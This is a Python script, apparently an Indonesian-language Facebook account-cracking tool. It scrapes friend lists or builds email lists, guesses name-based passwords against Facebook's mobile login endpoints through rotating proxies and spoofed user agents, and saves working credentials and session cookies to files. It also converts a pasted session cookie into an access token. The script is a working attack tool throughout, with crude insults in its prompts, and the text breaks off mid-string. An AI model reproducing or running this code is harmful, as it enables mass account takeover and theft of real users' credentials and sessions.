#----------[ IMPORT-MODULE ]----------#
import os

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#
import re, json, sys, random, time, datetime, requests
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as cetak
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.tree import Tree
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich import print as prints
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
tokenku, tokenefb = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#----------[ USER-CRACK ]----------#  
def ugenku(idf):
	rr, rc = random.randint, random.choice
	brayen1=f'Mozilla/6.0 (Filipina; (iPad; CPU OS 4_3_3 like Mac OS X) AppleWebKit/650.2.12 (KHTML, like Gecko) Broswer/516.0.1.0 Safari/567.36'
	brayen2=f'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/117.0.5938.108 Mobile/15E148 Safari/604.1'
	brayen3=f'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) BC3 iOS/3.12.8 (build 541; iPhone XR; iOS 15.0.1'
	brayen4=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
	brayen5=f'Mozilla/6.0 (Filipina; (vx4;SMG-SAMSUNG) AppleWebKit/690.84 (KHTML,like Gecko) Filipina/156.0.9.0 safari/537.36'
	brayen6=f'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36'
	brayen7=f'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0'
	brayen8=f'Mozilla/5.0 (Linux; Android 5.1; XT1254 Build/SU3TL-39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36'
	brayen9=f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36'
	brayen10=f'stagefright/1.2 (Linux;Android 4.4.2) ;Flipina; (iPad; CPU OS 4_3_3 like Mac OS X) AppleWebKit/650.2.12 (KHTML, like Gecko) Broswer/516.0.1.0'
	return rc([brayen1,brayen2,brayen3,brayen4,brayen5,brayen6,brayen7,brayen8,brayen9,brayen10])
#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
def clear():
	os.system('clear')
def back():
	login()
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
def banner():
      clear()
      cetak(panel(f""" [bold ung]                                                      
_____ _   _ _     _            ___    _  ___
|  ___| | | | |   | |          |_ _|  | |/ _ \
| |_  | | | | |   | |      _____| |_  | | | | |
|  _| | |_| | |___| |___  |_____| | |_| | |_| |
|_|    \___/|_____|_____|      |___\___/ \___/
[red]---⌲ IJO JANGAN LUPA PAMER


                                                                                                                                
                                                                                            """,width=90,style=f" bold yellow",title=f"[blue]Author : [green]PRABU",subtitle=f"[blue]Version : [green]5.2.5",))    	
###----------[ LOGIN COOKIESNYA ]----------###
def login1():
    clear();banner();cetak(panel(f"[white]Masukin tumbal mu beb 💦\nSaran Exstesion [green]©Cookiedough",width=70,style=f"bold yellow"))
    cookie = input(f'Cookie : {hijo}')
    token_eaab = generate_token_eaab(cookie)
    print('Token :%s %s'%(kun,token_eaab))
    tokenw = open(".fiitoken.txt", "w").write(token_eaab)
    cokiew = open(".fiicok.txt", "w").write(cookie)
    print(f"\n{puti}Login Sukses Semoga Hijau💚");exit()
def generate_token_eaab(cok):
    r = requests.Session()
    req1 = r.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':cok},allow_redirects=True).text
    nek1 = re.search('window\.location\.replace\("(.*?)"\)',str(req1)).group(1).replace('\\','')
    req2 = r.get(nek1,cookies={'cookie':cok},allow_redirects=True).text
    tok  = re.search('accessToken="(.*?)"',str(req2)).group(1)
    return(tok)
#---------->> MENNU-HAKANEN <<----------#
def login():
	try:
		token = open('.fiitoken.txt','r').read()
		cok = open('.fiicok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu1(sy2,sy3)
		except KeyError:
			login1()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login1()
def menu1(idfb,namefb):
	try:token = open('.fiitoken.txt','r').read();cok = open('.fiicok.txt','r').read()
	except IOError:print(f'{P}Expired Cookies{x} ');time.sleep(5);login1()
	os.system('clear');banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(panel(f"[purple]-⌲ Nama   : [green]{idfb}[purple]\n-⌲ ID    : [green]{namefb}[purple]\n-⌲ IP   : [green]{ip}\n[purple]-⌲ STATUS     : [green]Premium[white]",width=70,style=f"bold yellow"))
	cetak(panel(f"[white][[green]01[green blue]]-⌲ CRACK PUBLIK [white]\n[[green]02[green blue]]-⌲ DUMP GMAILl[white]\n[[green]03[green blue]]-⌲ CEK RESULT [white]\n[[green]00[green blue]]-⌲ HAPUS TUMBAL",width=70,style=f"bold yellow"))
	xyz = input(f'PILIH 👨‍👩‍👦 : ')
	if xyz in ['01','1']:dump_publik()
	elif xyz in ['02','2']:dump_mail()
	elif xyz in ['03','3']:result()
	elif xyz in ['00','0']:os.system('rm -rf .fiitoken.txt');os.system('rm -rf .fiicok.txt');print(f'{K}Timbal Lu udh Out')
	else:print('Yang Bener Ngentot👶');time.sleep(4);back()
def dump_publik():
    uid = []
    tok = open('.fiitoken.txt','r').read()
    cok = open('.fiicok.txt','r').read()
    print(f"{puti}Pastikan ID Target bersifat publik")
    print(f"{puti}Jika Dump {mer}0 {puti}Kemungkinan Teman Tidak Publik")
    lid = input('ID TARGET🖕 : ').split(',')
    for usrr in lid:
        try:
            r = requests.Session()
            url = f'https://graph.facebook.com/v12.0/{usrr}/friends'
            LoopDump(r, cok, tok, url, id, None)
        except KeyboardInterrupt: pass
        except Exception as e: pass
        print(f"\n{puti}TOTAL TARGET ; {kun}{len(id)}")
    atur_dulu()
def LoopDump(r, cok, tok, url, id, after):
    try:
        dta = {'access_token':tok,'after':after,'pretty':'1'}
        req = r.get(url,params=dta,cookies={'cookies':cok}).json()
        if 'temporarily blocked' in str(req):
            print('Oops, Sepertinya Akunmu Spam!')
            exit('')
        for d in req['data']:
            try:
                woy = (d['id']+'|'+d['name'])
                if woy in id:pass
                else:id.append(woy)
                print('\rSEDANG SANGE💦 %s ID'%(str(len(id))),end=''); sys.stdout.flush()
            except Exception as e: continue
        after = req['paging']['cursors']['after']
        LoopDump(r,cok,tok,url,id,after)
    except KeyboardInterrupt: pass
    except Exception as e: pass	
#----------[ CRACK EMAIL ]-----------#
def dump_mail():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','ika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wiwin','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','aji','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['boy','mabok','eam','aulia','kasih','cantik','kasep','ganteng','tzy','1','2','3','4','5','6','7','8','9','99','official','gaming','utama','123','1234','12345','123456','cakep','sunda']
	global ok , cp
	#cetak(panel(f'Masukan nama yang ingin kalian crack',width=70,padding=(0,7),style=f"{isukwe}")) 
	print('')
	nama = input('Username : ')
	if ',' in str(nama):
		exit(f'[+] -⌲ Masukan Nama Target')
	doma = input(f"{puti}-⌲ Masukan domain : {hijo}")
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'[+] masukan domain yang benar')
	jumlah = input('[+] Masukan total : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(id)==1010101010101010101:atur_dulu()
		print('\rTotal \033[32m%s \033[0mID'%(len(id)),end='')
	#	sys.stdout.flush()
	atur_dulu()
#----------[ HASIL OK-CP]----------#
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f"[white][[green]01[bold bule]]. Cek Hasil OK[white]\n[[green]02[bold red]]. Cek Hasil CP[white]",width=70,style=f"{colorpanel}",title=f"Menu Cek"))
	kz = input('\nPilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]')
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]')
			geeh = input('\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cetak(panel(f'[white]ID   :[yellow] {cpkuni[0]}\n[white]PASS :[yellow] {cpkuni[1]}',width=70,style=f"blue"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]')
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]')
			geeh = input('\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cetak(panel(f'[white]ID   : [green]{cpkuni[0]}\n[white]PASS : [green]{cpkuni[1]}\n[green]{cpkuni[2]}',width=70,style=f"blue"))
			#	print(f'{H}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#----------[ MENU-IDZ ]----------#		
def atur_dulu():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	cetak(panel(f"[white][[green]01[white]]. Validate[white]\n[[green]02[white]]. Mbasic[white]\n[[green]03[white]]. Async[white]\n[[green]04[white]]. Gacor ",width=70,style=f"bold yellow"))
	FiiXcMethod = input("Pilih : ")
	if FiiXcMethod in ['1','01']:
	   method.append('validate')  
	elif FiiXcMethod in ['2','02']:
	   method.append('reguler')       
	elif FiiXcMethod in ['3','03']:
	   method.append('asyinc')
	elif FiiXcMethod in ['4','04']:
		method.append('Gacor')
	else:
		method.append('validate')
	passwtamb = input(f'Tambahkan Pw Manual {kun}Y/{mer}T : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     cetak(panel(f"[white]Masukan Pw Tambahan Contoh [green]Sayang,Bagong,jakarta",width=70,style=f"bold yellow"))
		     sandiku = input(f'Password : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	cetak(panel(f"[white]Hasil [yellow]CP [white]Save In [yellow]CP/{cpc}[white]\nHasil [green]OK [white] Save In [green]OK/{okc}",width=70,subtitle=f"[white]Mainkan Mode Pesawat Setiap [red] 10 [white]Detik",style=f"bold yellow"))
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456')
						pwx.append('00')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'321')
						pwx.append(frestile+'4321')
						pwx.append(frestile+'54321')
						pwx.append(frestile+'321')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						pwx.append(frestile+'00')
						pwx.append('bagong')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				elif 'reguler' in method:
				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.facebook.com')
				elif 'b api' in method:
					pemuda_tersakiti.submit(crackbapi,idf,pwx,'m.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	cetak(panel(f"[white]Crack Selesai Hasil Di Simpan Di Result\nHasil [green]OK:{ok}[white]\nHasil [yellow]CP:{cp}",width=70,style=f"bold yellow"))
	exit()
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["🖕","😜","🥴"])
	prog.update(des,description=f"\r[bold white][[green]{idf}[white]] [[green]{len(id)}[white]/[yellow]{loop}[white]] [[green]OK : {ok}[white]] [[yellow]CP:{cp}[white]]")
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = ugenku(idf)
			#ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])			
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				cetak(panel(f"\r[green]D    : {idf}\nPW    : {pw}\nTAHUN : {tahun(idf)}\n{kuki}",width=90,style=f"bold green",title=f"[white]AKHIRNYA IJO💚"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			#	open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"\r[b yellow]ID    : {idf}\nPW    : {pw}\nUA    : {ua}",style=f"bold yellow",width=90,title=f"[bold white]KASIHAN CP😭"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akune.append(idf+'|'+pw)
			#	ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r[bold white][[green]{idf}[white]] [[green]{len(id)}[white]/[yellow]{loop}[white]] [[green]OK : {ok}[white]] [[yellow]CP:{cp}[white]]")
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = ugenku(idf)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"]) 		
			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
			head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				cetak(panel(f"\r[green]D    : {idf}\nPW    : {pw}\nTAHUN : {tahun(idf)}\n{kuki}",width=90,style=f"bold green",title=f"[white]Fadil-OK"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			#	open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"\r[b yellow]ID    : {idf}\nPW    : {pw}\nUA    : {ua}",style=f"bold yellow",width=90,title=f"[bold white]Fadil-CP"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akune.append(idf+'|'+pw)
			#	ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r[bold white][[green]{idf}[white]] [[green]{len(id)}[white]/[yellow]{loop}[white]] [[green]OK : {ok}[white]] [[yellow]CP:{cp}[white]]")
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = ugenku(idf)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc([f"https://{url}/login.php?skip_api_login=1&api_key=2099441543493930&kid_directed_site=0&app_id=2099441543493930&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&